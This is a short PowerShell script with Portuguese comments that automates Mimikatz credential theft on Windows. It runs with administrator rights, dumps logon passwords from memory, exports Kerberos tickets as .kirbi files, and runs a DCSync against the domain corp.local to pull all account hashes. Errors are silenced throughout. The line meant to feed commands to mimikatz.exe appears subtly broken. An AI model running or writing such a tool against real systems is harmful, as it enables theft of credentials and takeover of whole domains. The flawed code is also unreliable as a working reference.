#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
Mimikatz Automation - Automatiza extração de credenciais

.EXAMPLE
.\mimikatz-automation.ps1 -LogonPasswords
.\mimikatz-automation.ps1 -DCSync
.\mimikatz-automation.ps1 -All
#>

param(
    [switch]$LogonPasswords,
    [switch]$Tickets,
    [switch]$DCSync,
    [switch]$Kerberos,
    [switch]$All
)

$ErrorActionPreference = "SilentlyContinue"

# Verificar se mimikatz existe
$mimiPath = "C:\tools\mimikatz.exe"
if (-not (Test-Path $mimiPath)) {
    Write-Host "[!] mimikatz não encontrado em $mimiPath" -ForegroundColor Red
    exit
}

Write-Host "[*] Mimikatz Automation" -ForegroundColor Cyan

$commands = @()

if ($LogonPasswords -or $All) {
    $commands += 'privilege::debug'
    $commands += 'sekurlsa::logonpasswords'
}

if ($Tickets -or $All) {
    $commands += 'sekurlsa::tickets /export'
}

if ($DCSync) {
    $commands += 'lsadump::dcsync /domain:corp.local /all /csv'
}

if ($Kerberos -or $All) {
    $commands += 'kerberos::list /export'
}

$mimiScript = $commands -join "`n"

Write-Host $mimiScript | & $mimiPath

Write-Host "[+] Execução completa" -ForegroundColor Green
Write-Host "[!] Verifique a pasta atual por arquivos .kirbi (tickets)" -ForegroundColor Yellow
